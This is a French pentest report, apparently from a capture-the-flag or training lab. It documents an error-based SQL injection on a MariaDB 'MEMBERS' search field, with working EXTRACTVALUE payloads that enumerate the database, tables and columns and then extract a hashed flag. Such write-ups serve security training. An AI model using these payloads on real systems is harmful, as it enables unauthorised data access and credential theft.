# Rapport de Pentest : SQL Injection (Error Based)

## 1. Description de la vulnérabilité
* **Cible :** Page `MEMBERS`.
* **Vecteur d'attaque :** Champ de recherche numérique (`id`).
* **Type de faille :** SQL Injection (Error Based - MariaDB).

### Analyse du contournement
Lors de la phase de détection, l'utilisation d'une simple apostrophe `'` a provoqué une erreur de syntaxe révélant un échappement via un backslash `\`. La vulnérabilité a été exploitée en injectant des commandes SQL sans utiliser d'apostrophes, car le système ne filtre pas les entrées numériques avant de les envoyer à la base de données.

---

## 2. Étapes d'exploitation et Preuves

### Étape 1 : Détection de la faille
L'objectif était de prouver que le champ de recherche interagit directement avec la base de données sans filtre.
* **Payload utilisé :** `'`
* **Résultat :** Affichage d'une erreur de syntaxe SQL MariaDB.
* **Preuve visuelle :** `screenshots/1. Preuve de la vulnérabilité (Détection).png`

### Étape 2 : Énumération de la Base de Données
Extraction du nom de la base de données via la fonction `EXTRACTVALUE` qui force l'affichage de données dans un message d'erreur XPATH.
* **Payload :** `1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))`
* **Résultat :** `Member_Sql_Injection`
* **Preuve visuelle :** `screenshots/2. Énumération de la Base de Données.png`

### Étape 3 : Énumération des Tables
Identification des tables présentes dans la base de données identifiée.
* **Payload :** `1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1), 0x7e))`
* **Résultat :** Table `users` identifiée.
* **Preuve visuelle :** `screenshots/3. Énumération de la Table.png`

### Étape 4 : Énumération des Colonnes (Méthode par Offset)
L'affichage étant limité à un résultat par erreur, nous avons utilisé la clause `OFFSET` pour lister les colonnes une par une. Après avoir exploré les colonnes `user_id`, `first_name`, `last_name`, `town`, `country`, `planet` et `Commentaire`, nous avons trouvé la colonne cible à l'Offset 7.
* **Payload (Offset 7) :** `1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273 LIMIT 1 OFFSET 7), 0x7e))`
* **Résultat :** Colonne `countersign` identifiée.
* **Preuve visuelle :** `screenshots/4. Énumération des Colonnes (Le pivot).png`

### Étape 5 : Extraction du Flag Final
Extraction du contenu (hash) stocké dans la colonne `countersign`.
* **Payload :** `1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT substring(countersign, 1, 64) FROM users LIMIT 1), 0x7e))`
* **Résultat (Flag) :** `2b3366bcfd44f540e630d4dc2b9b06d9`
* **Preuve visuelle :** `screenshots/5. Extraction finale du Flag.png`

---
